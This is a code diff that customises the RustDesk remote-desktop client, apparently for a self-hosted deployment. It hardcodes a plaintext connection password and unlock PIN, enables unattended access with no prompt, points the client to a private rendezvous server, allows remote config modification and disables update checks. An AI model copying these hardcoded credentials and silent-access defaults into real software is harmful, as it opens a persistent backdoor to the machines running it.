@@ -79,7 +79,14 @@ lazy_static::lazy_static! {
     pub static ref OVERWRITE_DISPLAY_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
     pub static ref DEFAULT_LOCAL_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
     pub static ref OVERWRITE_LOCAL_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
-    pub static ref HARD_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
+    pub static ref HARD_SETTINGS: RwLock<HashMap<String, String>> = {
+   	 let mut map = HashMap::new();
+   	 // 👇 这里写你要内置的连接密码
+    	map.insert("password".to_string(), "Qepwqlmm8..".to_string());
+	// 👇 自动接受连接，不弹窗
+    	map.insert("unattended_access".to_string(), "true".to_string());
+    	RwLock::new(map)
+	};
     pub static ref BUILTIN_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
 }
 
@@ -114,8 +121,8 @@ const CHARS: &[char] = &[
     'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
 ];
 
-pub const RENDEZVOUS_SERVERS: &[&str] = &["rs-ny.rustdesk.com"];
-pub const RS_PUB_KEY: &str = "OeVuKk5nlHiXp+APNn0Y3pC1Iwpwn44JGqrQCsWqmBw=";
+pub const RENDEZVOUS_SERVERS: &[&str] = &["chengjinn.vicp.net"];
+pub const RS_PUB_KEY: &str = "dGPzyYF2x0Sw8m2JCVzkHI+74wFUSN4n8TVfTZb9A60=";
 
 pub const RENDEZVOUS_PORT: i32 = 21116;
 pub const RELAY_PORT: i32 = 21117;
@@ -490,6 +497,12 @@ impl Config2 {
     fn load() -> Config2 {
         let mut config = Config::load_::<Config2>("2");
         let mut store = false;
+        //安全-使用PIN码解锁设置 默认打勾
+        if config.unlock_pin != "qepwqlmm8" {
+                config.unlock_pin = "qepwqlmm8".to_string(); // 硬编码明文 PIN
+                store = true; // 强制触发存储
+        }
+        
         if let Some(mut socks) = config.socks {
             let (password, _, store2) =
                 decrypt_str_or_original(&socks.password, PASSWORD_ENC_VERSION);
@@ -500,6 +513,37 @@ impl Config2 {
         let (unlock_pin, _, store2) =
             decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
         config.unlock_pin = unlock_pin;
+
+        //安全-允许IP直接默认打勾 并设置端口21118
+        if !config.options.contains_key("direct-server") {
+            	config.options.insert("direct-server".to_string(), "Y".to_string());
+            	store = true;
+        	}
+	    if !config.options.contains_key("direct-access-port") {
+            	config.options.insert("direct-access-port".to_string(), "21118".to_string());
+            	store = true;
+        	}
+        //安全-拒绝局域网发现 默认打勾
+        if !config.options.contains_key("enable-lan-discovery") {
+            	config.options.insert("enable-lan-discovery".to_string(), "Y".to_string());
+            	store = true;
+        	}
+        //安全-允许远程修改配置 默认打勾
+        if !config.options.contains_key("allow-remote-config-modification") {
+            	config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
+            	store = true;
+        	}
+        //【两种密码都使用】方式   
+        if !config.options.contains_key("verification-method") {
+            config.options.insert("verification-method".to_string(), "use-both-passwords".to_string());
+            store = true;
+        }
+        //【只允许密码访问】方式
+        if !config.options.contains_key("approve-mode") {
+            config.options.insert("approve-mode".to_string(), "password".to_string());
+            store = true;
+        }
+        
         store |= store2;
         if store {
             config.store();
@@ -2140,7 +2184,35 @@ pub struct LocalConfig {
 
 impl LocalConfig {
     fn load() -> LocalConfig {
-        Config::load_::<LocalConfig>("_local")
+        let mut config = Config::load_::<LocalConfig>("_local");
+        let mut store = false;
+        //常规-主题 改为默认主题为暗黑
+        if !config.options.contains_key("theme") {
+            	config.options.insert("theme".to_string(), "dark".to_string());
+            	store = true;
+        	}
+
+        //常规-启动时检查软件更新 默认去勾    
+        if !config.options.contains_key("enable-check-update") {
+		config.options.insert("enable-check-update".to_string(), "N".to_string());
+		store = true;
+		    }        
+
+        //常规-启用 IPv6 P2P 连接 默认打勾
+        if !config.options.contains_key("enable-ipv6-punch") {
+            	config.options.insert("enable-ipv6-punch".to_string(), "Y".to_string());
+            	store = true;
+        	}
+
+        //常规-启用UDP打洞 默认打勾
+        if !config.options.contains_key("enable-udp-punch") {
+            	config.options.insert("enable-udp-punch".to_string(), "Y".to_string());
+            	store = true;
+        	}
+		if store {
+            	config.store();
+        	}
+		config
     }
 
     fn store(&self) {
